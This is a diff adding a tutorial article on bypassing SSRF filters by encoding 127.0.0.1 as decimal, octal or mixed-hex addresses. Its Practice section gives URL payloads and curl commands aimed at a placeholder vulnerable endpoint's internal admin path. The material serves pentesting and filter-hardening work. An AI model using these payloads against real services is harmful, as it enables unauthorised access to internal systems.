@@ -1,0 +1,103 @@
+---
+title: Bypass SSRF Filters with Encoded IP Addresses
+description: Learn how to bypass SSRF filters using decimal, octal, and mixed encoded
+  IP addresses.
+keywords:
+- SSRF
+- encoded IP address
+- filter bypass
+- decimal IP
+- octal IP
+- hexadecimal IP
+- web security
+- numeric encoding
+---
+
+# Bypass Using an Encoded IP Address
+
+## Context
+
+In this article, we will explore a method to bypass Server-Side Request Forgery (SSRF) filters by encoding IP addresses in alternative numeric formats. This technique leverages the fact that web servers can resolve non-standard IP encodings to valid internal addresses, often bypassing filters that check for standard patterns. Before proceeding, it is assumed that you have a working knowledge of standard IPv4 and IPv6 address formats, URL encoding and decoding, as well as basic SSRF exploitation workflows.
+
+## Theory
+
+### IP Address Numeric Encodings
+
+IP addresses are typically written in a dot-decimal format, but they can also be represented in various numeric encodings such as decimal, octal, and hexadecimal, or even as a single integer. This methodology exploits the tendency of web servers to interpret and resolve these non-standard formats into valid addresses internally.
+
+#### Definition
+
+IP addresses can be expressed in formats other than the regular dot-decimal notation. They can be represented as a decimal number, an octal number, hexadecimal, or as a single integer number. Each of these representations can potentially be resolved by web servers into valid addresses, thus bypassing traditional security filters that overlook these formats.
+
+#### Core Principle
+
+Many servers are capable of interpreting these encoded representations correctly, which can be used to access internal resources that standard filters might attempt to block.
+
+#### Vulnerability Model
+
+SSRF filters often rely on straightforward pattern matching to identify IP addresses. They may not account for encoded representations, thereby allowing attackers to bypass these security checks by using alternative numeric encodings.
+
+### Filter Bypass via Encoded IPs
+
+When users supply IP addresses in encoded formats, web servers can decode and connect to the intended internal resources. SSRF attacks can benefit from this behavior to access otherwise restricted areas.
+
+#### Attack Sequence
+
+The attacker encodes an IP address using one of the numeric methods and sends a request. The receiving web server decodes this and connects to the intended target. By exploiting this vector, attackers can bypass input validation and communicate with internal systems.
+
+#### Filter Bypass Logic
+
+Filters using regex or basic string matching may not account for these encoded or integer forms of IP addresses, making it easier for attackers to bypass security measures.
+
+## Practice
+
+### Bypassing SSRF Filters with Decimal-Encoded IP
+
+- **Convert 127.0.0.1 to its decimal representation: 2130706433.** This is accomplished by calculating `(127*256^3)+(0*256^2)+(0*256^1)+(1*256^0)`.
+
+- **Use the decimal IP in the SSRF payload.** Example:
+    ```http
+    http://2130706433/admin
+    ```
+
+- **Send the payload to the SSRF endpoint.** Using curl:
+    ```bash
+    curl 'http://vulnerable-app/ssrf?url=http://2130706433/admin'
+    ```
+  By doing this, you should be able to access internal resources using the decimal-encoded IP.
+
+### Bypassing SSRF Filters with Octal-Encoded IP
+
+- **Convert 127.0.0.1 to octal: 0177.0.0.01.** Each octet reflects its octal representation.
+
+- **Use the octal IP in your payload.** Example:
+    ```http
+    http://0177.0.0.01/admin
+    ```
+
+- **Send the octal-encoded IP to the SSRF endpoint.**
+    ```bash
+    curl 'http://vulnerable-app/ssrf?url=http://0177.0.0.01/admin'
+    ```
+  This allows you to reach the target resource internally by using an octal representation.
+
+### Bypassing SSRF Filters with Mixed Numeric IP Encoding
+
+- **Example of a mixed representation: 127.0.0.0x1.** This employs a combination of decimal and hexadecimal notations.
+
+- **Use the mixed encoding in the payload.** Example:
+    ```http
+    http://127.0.0.0x1/admin
+    ```
+
+- **Send the mixed-encoded IP to the SSRF endpoint.**
+    ```bash
+    curl 'http://vulnerable-app/ssrf?url=http://127.0.0.0x1/admin'
+    ```
+  This technique helps evade filters that check for uniform IP patterns.
+
+## Tools
+
+- **curl**
+- **Burp Suite**
+- **CyberChef**
